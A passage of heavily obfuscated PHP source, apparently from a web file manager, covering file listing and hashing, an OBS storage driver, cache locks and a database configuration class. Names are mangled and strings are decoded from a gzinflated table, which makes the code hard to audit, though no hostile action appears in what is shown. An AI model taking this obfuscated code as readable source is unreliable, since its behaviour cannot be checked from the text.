$·ñ¸ÅÑ‡ = false) { $­ÀªË¶™ =& $_SERVER[™¸œØ®Ü]; $–®­ÜˆÑ = $this->iconvApp($this->pathThis($‘ä´çÈì)); if ($·ñ¸ÅÑ‡) { return array($­ÀªË¶™[32] => $–®­ÜˆÑ, $­ÀªË¶™[87] => $this->getPathOuter($‘ä´çÈì), $­ÀªË¶™[33] => $­ÀªË¶™[232], $­ÀªË¶™[79] => $this->size($‘ä´çÈì), $­ÀªË¶™[169] => $this->ext($–®­ÜˆÑ)); } $äŞà—ºĞ = array($­ÀªË¶™[32] => $–®­ÜˆÑ, $­ÀªË¶™[87] => $this->getPathOuter($‘ä´çÈì), $­ÀªË¶™[33] => $­ÀªË¶™[232], $­ÀªË¶™[233] => @filectime($‘ä´çÈì), $­ÀªË¶™[88] => @filemtime($‘ä´çÈì), $­ÀªË¶™[1477] => @fileatime($‘ä´çÈì), $­ÀªË¶™[79] => $this->size($‘ä´çÈì), $­ÀªË¶™[169] => $this->ext($–®­ÜˆÑ), $­ÀªË¶™[1478] => is_readable($‘ä´çÈì), $­ÀªË¶™[1479] => is_writable($‘ä´çÈì), $­ÀªË¶™[1480] => get_mode($‘ä´çÈì)); return $äŞà—ºĞ; } public function exist($³Éè€ãõ) { $³Éè€ãõ = $this->iconvSystem($³Éè€ãõ); return @file_exists($³Éè€ãõ); } public function isFile($À’ÁÍÀÚ) { $À’ÁÍÀÚ = $this->iconvSystem($À’ÁÍÀÚ); return @is_file($À’ÁÍÀÚ); } public function isFolder($Ûõ²™ğû) { $Ûõ²™ğû = $this->iconvSystem($Ûõ²™ğû); return @is_dir($Ûõ²™ğû); } public function listPath($„°÷Ò¤Ù, $ä• ç×’ = false) { $·ÀÈ®âí =& $_SERVER[™¸œØ®Ü]; $„°÷Ò¤Ù = $this->iconvSystem($„°÷Ò¤Ù); $„°÷Ò¤Ù = rtrim($„°÷Ò¤Ù, $·ÀÈ®âí[8]) . $·ÀÈ®âí[8]; $³õğï‘õ = array($·ÀÈ®âí[85] => array(), $·ÀÈ®âí[86] => array()); if (!($”õ©á°Ë = @opendir($„°÷Ò¤Ù))) { return $³õğï‘õ; } while (($çÕúõŞ = readdir($”õ©á°Ë)) !== !1) { if ($çÕúõŞ == $·ÀÈ®âí[10] || $çÕúõŞ == $·ÀÈ®âí[1382]) { continue; } $©¹ø’ó‰ = $„°÷Ò¤Ù . $çÕúõŞ; if (is_file($©¹ø’ó‰)) { $³õğï‘õ[$·ÀÈ®âí[86]][] = $this->fileInfo($©¹ø’ó‰, $ä• ç×’); } else { $³õğï‘õ[$·ÀÈ®âí[85]][] = $this->folderInfo($©¹ø’ó‰, $ä• ç×’); } } closedir($”õ©á°Ë); return $³õğï‘õ; } public function listAll($ô‚ÊÀ¤†, &$›ëï½ïÑ = array()) { $Ê–¹•âŸ =& $_SERVER[™¸œØ®Ü]; $ô‚ÊÀ¤† = $this->iconvSystem($ô‚ÊÀ¤†); $ô‚ÊÀ¤† = rtrim($ô‚ÊÀ¤†, $Ê–¹•âŸ[8]) . $Ê–¹•âŸ[8]; if (!($Û·áŸ™£ = @opendir($ô‚ÊÀ¤†))) { return $›ëï½ïÑ; } while (($ÄÏÌóŞÆ = readdir($Û·áŸ™£)) !== !1) { if ($ÄÏÌóŞÆ == $Ê–¹•âŸ[10] || $ÄÏÌóŞÆ == $Ê–¹•âŸ[1382]) { continue; } $éÙÙ¬ûş = $ô‚ÊÀ¤† . $ÄÏÌóŞÆ; $Ì£¯êŞ„ = is_dir($éÙÙ¬ûş) && !is_link($éÙÙ¬ûş) ? 1 : 0; $éÙÙ¬ûş = $Ì£¯êŞ„ ? $éÙÙ¬ûş . $Ê–¹•âŸ[8] : $éÙÙ¬ûş; $›ëï½ïÑ[] = array($Ê–¹•âŸ[87] => $this->getPathOuter($éÙÙ¬ûş), $Ê–¹•âŸ[78] => $Ì£¯êŞ„, $Ê–¹•âŸ[88] => intval(@filemtime($éÙÙ¬ûş)), $Ê–¹•âŸ[79] => $Ì£¯êŞ„ ? 0 : intval($this->size($éÙÙ¬ûş))); if ($Ì£¯êŞ„) { $this->listAll($éÙÙ¬ûş, $›ëï½ïÑ); } } closedir($Û·áŸ™£); return $›ëï½ïÑ; } public function has($«…¨³áÖ, $ÀÂÚïÛÓ = false, $èü›ÏÂœ = true) { $İšÁñÛ¬ =& $_SERVER[™¸œØ®Ü]; $«…¨³áÖ = $this->iconvSystem($«…¨³áÖ); $«…¨³áÖ = rtrim($«…¨³áÖ, $İšÁñÛ¬[8]) . $İšÁñÛ¬[8]; if (!($öÌõÒ× = @opendir($«…¨³áÖ))) { return !1; } $İ®şŒ¡ä = 0; $ñüŞ©İÇ = 0; $Æù”ğÙ· = 0; while (($Å¦™÷®¬ = readdir($öÌõÒ×)) !== !1) { if ($Å¦™÷®¬ == $İšÁñÛ¬[10] || $Å¦™÷®¬ == $İšÁñÛ¬[1382]) { continue; } $×˜È³ùÄ = $«…¨³áÖ . $Å¦™÷®¬; if ($ÀÂÚïÛÓ) { $Æù”ğÙ·++; if (@is_file($×˜È³ùÄ)) { $İ®şŒ¡ä++; } else { $ñüŞ©İÇ++; } if ($Æù”ğÙ· > 10000) { break; } continue; } if ($èü›ÏÂœ) { if (@is_file($×˜È³ùÄ)) { return !0; } } else { if (@is_dir($×˜È³ùÄ . $İšÁñÛ¬[8])) { return !0; } } } closedir($öÌõÒ×); if ($ÀÂÚïÛÓ) { return array($İšÁñÛ¬[241] => $İ®şŒ¡ä, $İšÁñÛ¬[242] => $ñüŞ©İÇ); } return !1; } public function hashSimple($ò’”ØôŒ) { $´Àó³Ş =& $_SERVER[™¸œØ®Ü]; if (!$ò’”ØôŒ) { return md5($´Àó³Ş[12]); } $ò’”ØôŒ = $this->iconvSystem($ò’”ØôŒ); $¼—Ùòó = $this->size($ò’”ØôŒ); $×…µÊà¹ = 200; $ÜËïéÛ¹ = 50; if ($¼—Ùòó <= $×…µÊà¹ * $ÜËïéÛ¹) { return $this->hashMd5($ò’”ØôŒ) . $¼—Ùòó; } $úäğÒŒ = $´Àó³Ş[12]; $’åËŒ£ñ = intval($¼—Ùòó / $ÜËïéÛ¹); $½õ¤Øò = fopen($ò’”ØôŒ, $´Àó³Ş[1481]); if (!$½õ¤Øò) { return $úäğÒŒ; } for ($­èŠ–¶ = 0; $­èŠ–¶ < $ÜËïéÛ¹; $­èŠ–¶++) { fseek_64($½õ¤Øò, $’åËŒ£ñ * $­èŠ–¶); $úäğÒŒ .= fread($½õ¤Øò, $×…µÊà¹); } fseek_64($½õ¤Øò, $¼—Ùòó - $×…µÊà¹); $úäğÒŒ .= fread($½õ¤Øò, $×…µÊà¹); fclose($½õ¤Øò); return md5($úäğÒŒ) . $¼—Ùòó; } public function getContent($Õ£æÔ“) { $Õ£æÔ“ = $this->iconvSystem($Õ£æÔ“); return file_get_contents($Õ£æÔ“); } public function setContent($ÊÓñë‚ú, $Œò™›üÇ = '') { $ÊÓñë‚ú = $this->iconvSystem($ÊÓñë‚ú); $–Ğ¢–® = @file_put_contents($ÊÓñë‚ú, $Œò™›üÇ, LOCK_EX); if (!$–Ğ¢–®) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); } clearstatcache(); @chmod($ÊÓñë‚ú, $this->pathAuth); return $–Ğ¢–® === !1 ? !1 : !0; } public function fileSubstr($õå™«Û‚, $¤†¬Ôöº = 0, $ì­—ÁÔ­ = false) { $Êš–ìÊ« =& $_SERVER[™¸œØ®Ü]; $õå™«Û‚ = $this->iconvSystem($õå™«Û‚); if ($ì­—ÁÔ­ === !1) { $ì­—ÁÔ­ = $this->size($õå™«Û‚); } if ($ì­—ÁÔ­ <= 0) { return $Êš–ìÊ«[12]; } $¾»¾Êü = fopen($õå™«Û‚, $Êš–ìÊ«[1481]); if (!$¾»¾Êü) { return !1; } fseek_64($¾»¾Êü, $¤†¬Ôöº); $’åÉ„Ñ = fread($¾»¾Êü, $ì­—ÁÔ­); fclose($¾»¾Êü); if (!$’åÉ„Ñ) { $this->writeLog(__FUNCTION__ . $Êš–ìÊ«[1473], !0); } return $’åÉ„Ñ; } public function upload($ç£Òœ²­, $éı°œÈÄ, $êş¶¥¬£ = false, $à˜¦¤ğ = REPEAT_REPLACE) { if ($êş¶¥¬£) { return $this->moveFile($éı°œÈÄ, $ç£Òœ²­); } return $this->copyFile($éı°œÈÄ, $ç£Òœ²­); } public function setModifyTime($îĞ ‰×’, $¹²¤Š¿± = '') { @touch($îĞ ‰×’, intval($¹²¤Š¿±)); } public function download($Âª—½Ñù, $ïå»ˆäŒ) { return $this->iconvSystem($Âª—½Ñù); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¨òÉ¸ş) { parent::__construct($¨òÉ¸ş); $this->setSignVersion($_SERVER[™¸œØ®Ü][249]); } public function fileOutImage($¾ğ®Ã°Õ, $Üù’Ôºç = 250) { $ÙœÂùì =& $_SERVER[™¸œØ®Ü]; if ($this->size($¾ğ®Ã°Õ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¾ğ®Ã°Õ, $Üù’Ôºç); } $Ó¼ãì¼… = array($ÙœÂùì[1482] => $ÙœÂùì[1483] . $Üù’Ôºç . $ÙœÂùì[1484]); $´’Ø‰Û„ = $this->link($¾ğ®Ã°Õ, $Ó¼ãì¼…); $this->fileOutLink($´’Ø‰Û„); } public function fileOutLink($û÷ÛˆØŒ) { $¯¡Êí™¤ =& $_SERVER[™¸œØ®Ü]; if (substr($û÷ÛˆØŒ, 0, 7) == $¯¡Êí™¤[218]) { $û÷ÛˆØŒ = $¯¡Êí™¤[219] . substr($û÷ÛˆØŒ, 7); } header($¯¡Êí™¤[175] . $û÷ÛˆØŒ); die; } } goto aäÙ·¿º–­; Cˆ‚¶Ò°§Û: if (!$grfcdubnje) { return; } $_SERVER[è”ÜÓ§œ] = explode($_SERVER[™¸œØ®Ü][687], gzinflate(substr($_SERVER[™¸œØ®Ü][688], 10, -8))); $utgwezmobd = $_SERVER[™¸œØ®Ü][689]; goto E‰’†—ƒô; AùÆÚ´ÈÆñ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $áãåù‚Ó =& $_SERVER[™¸œØ®Ü]; $õ‚½– = $GLOBALS[$áãåù‚Ó[6]][$áãåù‚Ó[426]]; self::$cachePath = $õ‚½–[$áãåù‚Ó[232]][$áãåù‚Ó[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ìû…ÉÄ, $®„ê»ê¹ = 0) { $¼§’Ñ­ñ =& $_SERVER[™¸œØ®Ü]; $ØÊßúËä = microtime(!0); $‰°É™úå = $ØÊßúËä + $®„ê»ê¹ + 0.0001; $àúòÛû• = rtrim(self::$cachePath, $¼§’Ñ­ñ[8]) . $¼§’Ñ­ñ[955] . md5($ìû…ÉÄ) . $¼§’Ñ­ñ[952]; if (file_exists($àúòÛû•) && filemtime($àúòÛû•) && filemtime($àúòÛû•) < time() - 10) { @unlink($àúòÛû•); } do { if (file_exists($àúòÛû•)) { cacheLockWait(); continue; } $µ«Î¼çå = fopen($àúòÛû•, $¼§’Ñ­ñ[956]); if (!$µ«Î¼çå) { return !1; } $Ë—İÌšˆ = flock($µ«Î¼çå, LOCK_EX | LOCK_NB); self::$caches[$ìû…ÉÄ] = array($¼§’Ñ­ñ[957] => $µ«Î¼çå, $¼§’Ñ­ñ[232] => $àúòÛû•); fwrite($µ«Î¼çå, $‰°É™úå); clearstatcache(); if ($µ«Î¼çå && $Ë—İÌšˆ) { return !0; } cacheLockWait(); } while (microtime(!0) < $‰°É™úå); $this->unlock($ìû…ÉÄ); return !1; } public function lockGet($ÅõıÕ¶Î) { $¡ÙùšÚ =& $_SERVER[™¸œØ®Ü]; $Ñœ·Œ¢¸ = rtrim(self::$cachePath, $¡ÙùšÚ[8]) . $¡ÙùšÚ[955] . md5($ÅõıÕ¶Î) . $¡ÙùšÚ[952]; return file_exists($Ñœ·Œ¢¸); } public function unlock($Íë ¬ä‰) { $ãÊ…„°† =& $_SERVER[™¸œØ®Ü]; $õì°áƒ£ = self::$caches[$Íë ¬ä‰]; if (!$õì°áƒ£) { return; } @flock($õì°áƒ£[$ãÊ…„°†[957]], LOCK_UN); @fclose($õì°áƒ£[$ãÊ…„°†[957]]); @unlink($õì°áƒ£[$ãÊ…„°†[232]]); unset(self::$caches[$Íë ¬ä‰]); } } class CacheLockRedis { public function lock($±õ…ëùİ, $Ò•ñÜ©” = 10) { $íş…¼ÒÆ = Cache::init(); $Éó™éøÑ = microtime(!0) + $Ò•ñÜ©”; while (microtime(!0) < $Éó™éøÑ) { $é™ø‹¯ñ = $íş…¼ÒÆ->get($±õ…ëùİ); if (!$é™ø‹¯ñ) { $öŠçÒÜ¸ = $íş…¼ÒÆ->setLock($±õ…ëùİ, $Éó™éøÑ, $Ò•ñÜ©”); if ($öŠçÒÜ¸) { return !0; } } else { if ($é™ø‹¯ñ < microtime(!0)) { $íş…¼ÒÆ->set($±õ…ëùİ, $Éó™éøÑ, $Ò•ñÜ©” * 2); if ($íş…¼ÒÆ->get($±õ…ëùİ) === $é™ø‹¯ñ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÜÊ©ÅÉĞ) { return Cache::init()->get($ÜÊ©ÅÉĞ); } public function unlock($æç¾®œÑ) { return Cache::init()->remove($æç¾®œÑ); } } goto B¾ÚÒàßÌ³; A‡¨³…Åè«: class DbSqlite3 extends DbSqlite3Base { public function query($û¢Ìš’ş) { $ª§šÆ­ =& $_SERVER[™¸œØ®Ü]; if (!CacheLock::fileLock($ª§šÆ­[13])) { return !1; } $Äõ÷ÖŞÒ = parent::query($û¢Ìš’ş); CacheLock::fileUnLock($ª§šÆ­[13]); return $Äõ÷ÖŞÒ; } public function execute($…Ç™Äºì) { $³à§úïŸ =& $_SERVER[™¸œØ®Ü]; if (!CacheLock::fileLock($³à§úïŸ[13])) { return !1; } $Â™é¹îá = parent::execute($…Ç™Äºì); CacheLock::fileUnLock($³à§úïŸ[13]); return $Â™é¹îá; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\x71" => "\74\76", "\x67\x74" => "\76", "\145\147\164" => "\x3e\75", "\x6c\164" => "\74", "\145\154\164" => "\74\x3d", "\x6e\x6f\164\154\x69\153\x65" => "\x4e\x4f\x54\40\x4c\111\113\x45", "\x6c\x69\x6b\145" => "\114\111\113\105", "\151\x6e" => "\x49\x4e", "\156\x6f\164\151\x6e" => "\x4e\117\124\40\111\x4e", "\156\x6f\x74\40\151\156" => "\x4e\x4f\x54\40\x49\x4e", "\142\x65\164\167\x65\145\156" => "\x42\x45\x54\x57\105\105\116", "\156\x6f\164\x62\145\164\x77\x65\x65\156" => "\116\117\124\40\x42\x45\124\127\x45\x45\x4e", "\x6e\157\164\40\x62\x65\x74\167\x65\x65\156" => "\x4e\x4f\124\40\x42\105\124\x57\105\105\x4e"); protected $selectSql = "\x53\x45\114\105\103\124\x25\104\111\x53\x54\111\116\x43\124\x25\40\x25\106\111\105\x4c\104\x25\x20\x46\122\x4f\x4d\40\x25\x54\101\x42\114\x45\x25\x25\112\117\x49\116\x25\x25\x57\110\105\122\x45\x25\x25\107\122\117\x55\120\45\45\x48\101\x56\x49\116\107\x25\x25\117\122\x44\x45\122\45\45\114\111\115\x49\x54\x25\x20\x25\125\x4e\111\117\x4e\45\45\x43\117\115\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $Œ‡Ÿêó = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[™¸œØ®Ü][1056], $Œ‡Ÿêó); } public function factory($©„¿ü = '') { $•ä“Ü„ı =& $_SERVER[™¸œØ®Ü]; $©„¿ü = $this->parseConfig($©„¿ü); if (empty($©„¿ü[$•ä“Ü„ı[1057]])) { think_exception(think_lang($•ä“Ü„ı[1058])); } $this->dbType = ucwords(strtolower($©„¿ü[$•ä“Ü„ı[1057]])); $Î ÕÜ¦¯ = $•ä“Ü„ı[1059] . $this->dbType; if (class_exists($Î ÕÜ¦¯)) { $¼Úº¸Ô = new $Î ÕÜ¦¯($©„¿ü); if ($•ä“Ü„ı[1060] != strtolower($©„¿ü[$•ä“Ü„ı[1057]])) { $¼Úº¸Ô->dbType = strtoupper($this->dbType); } else { $¼Úº¸Ô->dbType = $this->_getDsnType($©„¿ü[$•ä“Ü„ı[1012]]); } } else { think_exception(think_lang($•ä“Ü„ı[1061]) . $•ä“Ü„ı[1062] . $Î ÕÜ¦¯); } return $¼Úº¸Ô; } public function __call($¯­™Ğ…, $Ş¶ïâÍ´) { if (method_exists($this, $¯­™Ğ…)) { return call_user_func_array(array($this, $¯­™Ğ…), $Ş¶ïâÍ´); } } protected function _getDsnType($ÑÏåÌ£²) { $Ÿ·Ñ›Ä = explode($_SERVER[™¸œØ®Ü][4], $ÑÏåÌ£²); $¢Ø¾å»Ê = strtoupper(trim($Ÿ·Ñ›Ä[0])); return $¢Ø¾å»Ê; } private function parseConfig($—ëùä»ë = '') { $ŞòáÙˆ˜ =& $_SERVER[™¸œØ®Ü]; if (!empty($—ëùä»ë) && is_string($—ëùä»ë)) { $—ëùä»ë = $this->parseDSN($—ëùä»ë); } elseif (is_array($—ëùä»ë)) { $—ëùä»ë = array_change_key_case($—ëùä»ë); $—ëùä»ë = array($ŞòáÙˆ˜[1057] => $—ëùä»ë[$ŞòáÙˆ˜[1063]], $ŞòáÙˆ˜[984] => $—ëùä»ë[$ŞòáÙˆ˜[1064]], $ŞòáÙˆ˜[985] => $—ëùä»ë[$ŞòáÙˆ˜[1065]], $ŞòáÙˆ˜[982] => $—ëùä»ë[$ŞòáÙˆ˜[1066]], $ŞòáÙˆ˜[983] => $—ëùä»ë[$ŞòáÙˆ˜[1067]], $ŞòáÙˆ˜[21] => $—ëùä»ë[$ŞòáÙˆ˜[1068]], $ŞòáÙˆ˜[1012] => $—ëùä»ë[$ŞòáÙˆ˜[1069]], $ŞòáÙˆ˜[17] => isset($—ëùä»ë[$ŞòáÙˆ˜[1070]]) ? $—ëùä»ë[$ŞòáÙˆ˜[1070]] : array()); } elseif (empty($—ëùä»ë)) { if (think_config($ŞòáÙˆ˜[1071]) && $ŞòáÙˆ˜[1060] != strtolower(think_config($ŞòáÙˆ˜[1072]))) { $—ëùä»ë = $this->parseDSN(think_config($ŞòáÙˆ˜[1071])); } else { $—ëùä»ë = array($ŞòáÙˆ˜[1057] => think_config($ŞòáÙˆ˜[1072]), $ŞòáÙˆ˜[984] => think_config($ŞòáÙˆ˜[1073]), $ŞòáÙˆ˜[985] => think_config($ŞòáÙˆ˜[1074]), $ŞòáÙˆ˜[982] => think_config($ŞòáÙˆ˜[1075]), $ŞòáÙˆ˜[983] => think_config($ŞòáÙˆ˜[1076]), $ŞòáÙˆ˜[21] => think_config($ŞòáÙˆ˜[325]), $ŞòáÙˆ˜[1012] => think_config($ŞòáÙˆ˜[1071]), $ŞòáÙˆ˜[17] => think_config($ŞòáÙˆ˜[1077])); } } return $—ëùä»ë; } protected function initConnect($“Ù¸ÊÔ… = true) { if (1 == think_config($_SERVER[™¸œØ®Ü][22])) { $this->_linkID = $this->multiConnect($“Ù¸ÊÔ…); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Şèëû¿’ => $ÕÏ”Ÿï) { $this->_linkID = $ÕÏ”Ÿï; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ãçÓœã = false) { $ß¬ÂÔ‡· =& $_SERVER[™¸œØ®Ü]; static $ğ±±ü–š = array(); static $İòÜõÂŒ = -1; if (empty($ğ±±ü–š)) { foreach ($this->config as $¦ÂåÍ‘¤ => $‚ÏõÏ¹ß) { $ğ±±ü–š[$¦ÂåÍ‘¤] = explode($ß¬ÂÔ‡·[50], $‚ÏõÏ¹ß); } } if (think_config($ß¬ÂÔ‡·[1078])) { if ($ãçÓœã || think_config($ß¬ÂÔ‡·[473]) === !0) { $Ì× ¿ìÈ = floor(mt_rand(0, think_config($ß¬ÂÔ‡·[1079]) - 1)); $İòÜõÂŒ = $Ì× ¿ìÈ; } else { if (is_numeric(think_config($ß¬ÂÔ‡·[1080]))) { $Ì× ¿ìÈ = think_config($ß¬ÂÔ‡·[1080]); } else { $Ì× ¿ìÈ = floor(mt_rand(think_config($ß¬ÂÔ‡·[1079]), count($ğ±±ü–š[$ß¬ÂÔ‡·[982]]) - 1)); } } } else { $Ì× ¿ìÈ = floor(mt_rand(0, count($ğ±±ü–š[$ß¬ÂÔ‡·[982]]) - 1)); $İòÜõÂŒ = $Ì× ¿ìÈ; } $Ì× ¿ìÈ = $İòÜõÂŒ !== -1 ? $İòÜõÂŒ : $Ì× ¿ìÈ; $ãçšÆêŒ = array($ß¬ÂÔ‡·[984] => isset($ğ±±ü–š[$ß¬ÂÔ‡·[984]][$Ì× ¿ìÈ]) ? $ğ±±ü–š[$ß¬ÂÔ‡·[984]][$Ì× ¿ìÈ] : $ğ±±ü–š[$ß¬ÂÔ‡·[984]][0], $ß¬ÂÔ‡·[985] => isset($ğ±±ü–š[$ß¬ÂÔ‡·[985]][$Ì× ¿ìÈ]) ? $ğ±±ü–š[$ß¬ÂÔ‡·[985]][$Ì× ¿ìÈ] : $ğ±±ü–š[$ß¬ÂÔ‡·[985]][0], $ß¬ÂÔ‡·[982] => isset($ğ±±ü–š[$ß¬ÂÔ‡·[982]][$Ì× ¿ìÈ]) ? $ğ±±ü–š[$ß¬ÂÔ‡·[982]][$Ì× ¿ìÈ] : $ğ±±ü–š[$ß¬ÂÔ‡·[982]][0], $ß¬ÂÔ‡·[983] => isset($ğ±±ü–š[$ß¬ÂÔ‡·[983]][$Ì× ¿ìÈ]) ? $ğ±±ü–š[$ß¬ÂÔ‡·[983]][$Ì× ¿ìÈ] : $ğ±±ü–š[$ß¬ÂÔ‡·[983]][0], $ß¬ÂÔ‡·[21] => isset($ğ±±ü–š[$ß¬ÂÔ‡·[21]][$Ì× ¿ìÈ]) ? $ğ±±ü–š[$ß¬ÂÔ‡·[21]][$Ì× ¿ìÈ] : $ğ±±ü–š[$ß¬ÂÔ‡·[21]][0], $ß¬ÂÔ‡·[1012] => isset($ğ±±ü–š[$ß¬ÂÔ‡·[1012]][$Ì× ¿ìÈ]) ? $ğ±±ü–š[$ß¬ÂÔ‡·[1012]][$Ì× ¿ìÈ] : $ğ±±ü–š[$ß¬ÂÔ‡·[1012]][0], $ß¬ÂÔ‡·[17] => isset($ğ±±ü–š[$ß¬ÂÔ‡·[17]][$Ì× ¿ìÈ]) ? $ğ±±ü–š[$ß¬ÂÔ‡·[17]][$Ì× ¿ìÈ] : $ğ±±ü–š[$ß¬ÂÔ‡·[17]][0]); return $this->connect($ãçšÆêŒ, $Ì× ¿ìÈ); } public function parseDSN($×¬òş¢¡) { $Ø§şÜã =& $_SERVER[™¸œØ®Ü]; if (empty($×¬òş¢¡)) { return !1; } $ ³¢‚ê‹ = parse_url($×¬òş¢¡); if ($ ³¢‚ê‹[$Ø§şÜã[207]]) { $ééãš£¤ = array($Ø§şÜã[1057] => $ ³¢‚ê‹[$Ø§şÜã[207]], $Ø§şÜã[984] => isset($ ³¢‚ê‹[$Ø§şÜã[669]]) ? $ ³¢‚ê‹[$Ø§şÜã[669]] : $Ø§şÜã[12], $Ø§şÜã[985] => isset($ ³¢‚ê‹[$Ø§şÜã[1081]]) ? $ ³¢‚ê‹[$Ø§şÜã[1081]] : $Ø§şÜã[12], $Ø§şÜã[982] => isset($ ³¢‚ê‹[$Ø§şÜã[208]]) ? $ ³¢‚ê‹[$Ø§şÜã[208]] : $Ø§şÜã[12], $Ø§şÜã[983] => isset($ ³¢‚ê‹[$Ø§şÜã[209]]) ? $ ³¢‚ê‹[$Ø§şÜã[209]] : $Ø§şÜã[12], $Ø§şÜã[21] => isset($ ³¢‚ê‹[$Ø§şÜã[87]]) ? substr($ ³¢‚ê‹[$Ø§şÜã[87]], 1) : $Ø§şÜã[12]); } else { preg_match($Ø§şÜã[1082], trim($×¬òş¢¡), $ŒØÓË’); $ééãš£¤ = array($Ø§şÜã[1057] => $ŒØÓË’[1], $Ø§şÜã[984] => $ŒØÓË’[2], $Ø§şÜã[985] => $ŒØÓË’[3], $Ø§şÜã[982] => $ŒØÓË’[4], $Ø§şÜã[983] => $ŒØÓË’[5], $Ø§şÜã[21] => $ŒØÓË’[6]); } $ééãš£¤[$Ø§şÜã[1012]] = $Ø§şÜã[12]; return $ééãš£¤; } protected function debug() { $ü‰ïíÓ =& $_SERVER[™¸œØ®Ü]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ü‰ïíÓ[1083]; if (think_config($ü‰ïíÓ[1084])) { think_status($ü‰ïíÓ[1085]); think_trace($this->queryStr . $ü‰ïíÓ[1086] . think_status($ü‰ïíÓ[24], $ü‰ïíÓ[1085], 6) . $ü‰ïíÓ[1087], $ü‰ïíÓ[12], $ü‰ïíÓ[1088]); } } protected function parseLock($©¬µ×£‹ = false) { $…²É«½Ó =& $_SERVER[™¸œØ®Ü]; if (!$©¬µ×£‹) { return $…²É«½Ó[12]; } if ($…²É«½Ó[1014] == $this->dbType) { return $…²É«½Ó[1089]; } return $…²É«½Ó[1090]; } protected function parseSet($£¾µß¥) { $¹öû†º± =& $_SERVER[™¸œØ®Ü]; foreach ($£¾µß¥ as $§ğÑšˆë => $†Ñ…ë Ë) { if (is_array($†Ñ…ë Ë) && $¹öû†º±[374] == $†Ñ…ë Ë[0]) { $Ó£‹èÂè[] = $this->parseKey($§ğÑšˆë) . $¹öû†º±[508] . $†Ñ…ë Ë[1]; } elseif (is_scalar($†Ñ…ë Ë) || is_null($†Ñ…ë Ë)) { $Ó£‹èÂè[] = $this->parseKey($§ğÑšˆë) . $¹öû†º±[508] . $this->parseValue($†Ñ…ë Ë); } } return $¹öû†º±[1091] . implode($¹öû†º±[50], $Ó£‹èÂè); } protected function bindParam($àşĞéæŠ, $Ò³Òºíä) { $this->bind[$_SERVER[™¸œØ®Ü][4] . $àşĞéæŠ] = $Ò³Òºíä; } protected function parseBind($éˆÎ¿Ú§) { $éˆÎ¿Ú§ = array_merge($this->bind, $éˆÎ¿Ú§); $this->bind = array(); return $éˆÎ¿Ú§; } function parseKey(&$¹ÏÜŸúï, $šˆÄ¤Òá = true) { if ($šˆÄ¤Òá) { $¹ÏÜŸúï = $this->parseKeyCheck($¹ÏÜŸúï); } return $¹ÏÜŸúï; } function parseKeyCheck($Í¨şªçŸ) { $ÖìÅºÃĞ =& $_SERVER[™¸œØ®Ü]; $Í¨şªçŸ = trim($Í¨şªçŸ); if (!preg_match($ÖìÅºÃĞ[1092], $Í¨şªçŸ)) { think_exception($ÖìÅºÃĞ[1093] . $Í¨şªçŸ); } return $Í¨şªçŸ; } protected function parseValue($ÔÍ‘ø¡Ñ) { $Û†ÌÉìº =& $_SERVER[™¸œØ®Ü]; if (is_string($ÔÍ‘ø¡Ñ)) { $ÔÍ‘ø¡Ñ = $Û†ÌÉìº[1053] . $this->escapeString($ÔÍ‘ø¡Ñ) . $Û†ÌÉìº[1053]; } elseif (isset($ÔÍ‘ø¡Ñ[0]) && is_string($ÔÍ‘ø¡Ñ[0]) && strtolower($ÔÍ‘ø¡Ñ[0]) == $Û†ÌÉìº[374]) { $ÔÍ‘ø¡Ñ = $this->escapeString($ÔÍ‘ø¡Ñ[1]); } elseif (is_array($ÔÍ‘ø¡Ñ)) { $ÔÍ‘ø¡Ñ = array_map(array($this, $Û†ÌÉìº[1054]), $ÔÍ‘ø¡Ñ); } elseif (is_bool($ÔÍ‘ø¡Ñ)) { $ÔÍ‘ø¡Ñ = $ÔÍ‘ø¡Ñ ? $Û†ÌÉìº[91] : $Û†ÌÉìº[230]; } elseif (is_null($ÔÍ‘ø¡Ñ)) { $ÔÍ‘ø¡Ñ = $Û†ÌÉìº[106]; } return $ÔÍ‘ø¡Ñ; } protected function parseField($¬•³ÏÍ‰) { $ĞÌŠ‹Œ =& $_SERVER[™¸œØ®Ü]; if (is_string($¬•³ÏÍ‰) && strpos($¬•³ÏÍ‰, $ĞÌŠ‹Œ[50])) { $¬•³ÏÍ‰ = explode($ĞÌŠ‹Œ[50], $¬•³ÏÍ‰); } if (is_array($¬•³ÏÍ‰)) { $…µÒ‡¯â = array(); foreach ($¬•³ÏÍ‰ as $ôÄ’Ø => $®½–©…·) { if (!is_numeric($ôÄ’Ø)) { $…µÒ‡¯â[] = $this->parseKey($ôÄ’Ø, !1) . $ĞÌŠ‹Œ[1094] . $this->parseKey($®½–©…·); } else { $…µÒ‡¯â[] = $this->parseKey($®½–©…·); } } $ÂÔƒí•œ = implode($ĞÌŠ‹Œ[50], $…µÒ‡¯â); } elseif (is_string($¬•³ÏÍ‰) && !empty($¬•³ÏÍ‰)) { $ÂÔƒí•œ = $¬•³ÏÍ‰; } else { $ÂÔƒí•œ = $ĞÌŠ‹Œ[222]; } return $ÂÔƒí•œ; } protected function parseTable($†é²à™œ) { $²Ô¡‚ôÆ =& $_SERVER[™¸œØ®Ü]; if (is_array($†é²à™œ)) { $ş÷ˆö´Í = array(); foreach 